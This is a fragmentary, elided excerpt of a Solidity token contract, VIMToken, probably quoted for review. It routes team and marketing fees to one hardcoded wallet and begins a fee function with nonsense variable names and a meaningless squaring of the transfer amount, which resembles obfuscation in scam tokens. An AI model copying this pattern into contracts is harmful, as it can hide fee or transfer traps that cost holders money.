...
contract VIMToken is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xEBe71D2402571b7a0c8741675c4dEce105332E83));
        marketingWalletAddress = payable(address(0xEBe71D2402571b7a0c8741675c4dEce105332E83));
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        uint256 feeAmount = 0;
        uint256 bruh = amount;
        uint256 blame = amount;
        uint256 blink = bruh * blame;
